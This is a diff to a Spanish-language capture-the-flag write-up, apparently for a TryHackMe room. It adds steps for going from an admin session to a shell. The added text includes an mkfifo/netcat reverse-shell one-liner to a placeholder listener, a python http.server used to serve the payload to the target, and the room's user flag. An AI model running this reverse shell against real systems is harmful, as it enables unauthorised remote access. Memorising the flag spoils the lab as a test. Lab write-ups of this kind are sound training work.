@@ -139,17 +139,43 @@ Cualquiera de las dos lleva al dashboard de administración, donde aparece el **
 
 ## 6. De admin a shell — `/var/www/user.txt`
 
-Con la sesión de admin, el vector es la **subida de ficheros** (el directorio `/uploads` que ya apareció en el gobuster): se sube una webshell/reverse shell y se lanza desde el navegador (tab *Online – Reverse Shell Generator* abierto en las capturas = [revshells.com](https://revshells.com)).
+Con la sesión de administrador hay varias piezas que encajan: el directorio **`/uploads`** del gobuster, la página **`upload_profile.php`** (subida de perfiles) y las pestañas de *Reverse Shell Generator* que se ven abiertas en las capturas.
 
-Con shell como `www-data`:
+**1 · Crear el payload** en Kali (reverse shell clásica con `mkfifo`), p. ej. con `nano shell.sh`:
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP_LOCAL 4444 >/tmp/f
+```
+
+![[Pasted image 20261118023407.png]]
+
+**2 · Servirlo** con un `http.server` para que la víctima lo baje (y con **Penelope** escuchando en el 4444, ver `Comando Rapido/Penelope — reverse shell.md`):
 
 ```bash
-cat /var/www/user.txt
+python3 -m http.server 8080
+```
+
+El log confirma que la máquina objetivo lo pidió:
+
+```
+10.66.190.111 - - [18/Nov/2026 02:15:30] "GET /shell.sh HTTP/1.1" 200 -
+```
+
+![[Pasted image 20261118023335.png]]
+
+**3 · La shell vuelve a Penelope** como `www-data` y el `ls` de `/var/www/html` muestra todo el arsenal de la app (`upload_profile.php`, `login.php.bak`, `config.php`… y el `shell.sh` que acabamos de bajar):
+
+![[Pasted image 20261118023256.png]]
+
+Con shell, la flag de usuario está en la raíz del sitio:
+
+```bash
+cd /var/www && cat user.txt
 ```
 
 **Flag 2 → `THM{SYSTEM_PWNED_SUCCESSFULLY}`**
 
-> ⚠️ **Pendiente de completar:** las capturas de esta fase (subida del shell, reverse shell y lectura de `user.txt`) se pegaron en un momento en el que los ficheros quedaron **vacíos (0 bytes)** y se perdieron — 6 imágenes. Si las repites, las integro aquí con el detalle exacto (ruta de subida, payload usado y cómo se lanzó).
+*(La fase anterior quedó con capturas vacías por un pegado fallido; estas 3 imágenes recuperan el proceso completo: payload → descarga → shell.)*
 
 **Preguntas de la sala (respondidas correctamente):**
 
